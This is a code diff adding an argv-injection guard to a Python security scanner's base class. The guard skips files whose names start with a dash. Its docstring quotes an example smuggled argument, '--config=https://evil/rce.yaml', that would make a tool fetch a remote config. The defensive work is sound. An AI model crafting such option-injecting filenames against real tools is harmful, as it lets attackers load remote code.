@@ -381,6 +381,39 @@ class BaseScanner(ABC):
             timeout=timeout
         )
 
+    def _reject_if_dash_prefixed(
+        self, file_path: Path, start_time: float
+    ) -> Optional['ScannerResult']:
+        """
+        Argv injection defense (defense-in-depth).
+
+        If a file's basename starts with '-', external tools may re-parse it as
+        a CLI option (e.g., '--config=https://evil/rce.yaml' would fetch a
+        remote rule file). The primary defense is the '--' separator before
+        the path positional; this helper is a secondary guard that refuses to
+        invoke any external tool for such filenames.
+
+        Args:
+            file_path: Path to file about to be scanned.
+            start_time: time.time() captured at scan entry (for scan_time).
+
+        Returns:
+            An error ScannerResult if the basename starts with '-', else None.
+        """
+        import time
+        if file_path.name.startswith('-'):
+            return ScannerResult(
+                scanner_name=self.name,
+                file_path=str(file_path),
+                issues=[],
+                scan_time=time.time() - start_time,
+                success=False,
+                error_message=(
+                    "Skipped (argv injection defense): filename starts with '-'"
+                ),
+            )
+        return None
+
     def get_install_instructions(self) -> str:
         """
         Get installation instructions for this scanner's tool
